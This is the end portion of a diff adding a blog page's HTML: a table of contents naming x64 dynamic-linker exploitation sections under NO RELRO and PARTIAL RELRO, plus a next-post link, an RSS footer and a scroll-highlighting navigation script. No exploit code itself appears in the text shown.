+<li><a href="#x64">x64</a>
+<ul>
+<li><a href="#no-relro-2">NO RELRO</a>
+<ul>
+<li><a href="#hijack-string-table">hijack string table</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90-2">分析</a></li>
+<li><a href="#exp-2">exp</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#partial-relro-2">PARTIAL RELRO</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8reloc_arg-2">利用reloc_arg</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90-3">分析</a></li>
+<li><a href="#exp-3">exp</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BC%AA%E9%80%A0link_map">伪造link_map</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90-4">分析</a></li>
+<li><a href="#exp-4">exp</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://kotoriseed.github.io/post/tcache summary/">
+              <h3 class="post-title">
+                Tcache Summary
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://kotoriseed.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
